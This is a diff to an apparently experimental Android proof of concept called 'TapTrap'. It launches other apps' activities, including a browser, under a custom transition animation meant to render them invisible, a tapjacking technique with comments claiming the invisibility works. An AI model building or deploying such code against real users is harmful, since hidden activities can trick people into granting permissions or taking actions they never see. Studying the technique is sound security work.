@@ -5,11 +5,15 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.res.Resources;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
 import android.util.Log;
+import android.view.animation.AlphaAnimation;
+import android.view.animation.Animation;
+import android.view.animation.AnimationUtils;
 
 import androidx.activity.ComponentActivity;
 import androidx.core.app.ActivityCompat;
@@ -115,6 +119,23 @@ public class TapTrap {
 
 
     public void testInvisible2() {
+        try {
+            Animation anim = AnimationUtils.loadAnimation(activity, R.anim.ani);
+
+            Log.d("TapTrap", "===== ANIMATION VALUES =====");
+            Log.d("TapTrap", "Duration: " + anim.getDuration() + "ms");
+            Log.d("TapTrap", "FillAfter: " + anim.getFillAfter());
+            Log.d("TapTrap", "StartTime: " + anim.getStartTime());
+            Log.d("TapTrap", "StartOffset: " + anim.getStartOffset());
+            Log.d("TapTrap", "RepeatMode: " + anim.getRepeatMode());
+            Log.d("TapTrap", "RepeatCount: " + anim.getRepeatCount());
+
+            // We can't get alpha values directly, but we can test the effect
+
+        } catch (Exception e) {
+            Log.e("TapTrap", "Error", e);
+        }
+
 
         int animId = R.anim.ani;
         Log.d("TapTrap", "Animation resource ID: " + animId);
@@ -130,17 +151,35 @@ public class TapTrap {
 
         // 🔴 LAUNCH ACTIVITY
         activity.startActivity(intent);
-
+        //activity.overridePendingTransition(0, 0);
+        //activity.overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
         // 🔴 MAKE IT INVISIBLE - THIS WORKS!
-        activity.overridePendingTransition(R.anim.ani, R.anim.ani);
+        activity.overridePendingTransition(R.anim.ani, 1);
+
 
         // Escape after delay
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            activity.startActivity(new Intent(activity, activity.getClass()));
-            activity.finish();
-        }, 2800);
+//        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+//            activity.startActivity(new Intent(activity, activity.getClass()));
+//            activity.finish();
+//        }, 4000);
     }
 
+
+    public void testWithWebBrowser() {
+
+
+
+        // Target a regular app (browser)
+        Intent intent = new Intent(Intent.ACTION_VIEW);
+        intent.setData(Uri.parse("https://www.google.com"));
+
+        activity.startActivity(intent);
+
+        // Apply invisible animation
+        //activity.overridePendingTransition(R.anim.ani2, R.anim.ani2);
+        activity.overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out);
+        Log.d("TapTrap", "Browser should be invisible");
+    }
 
 
 
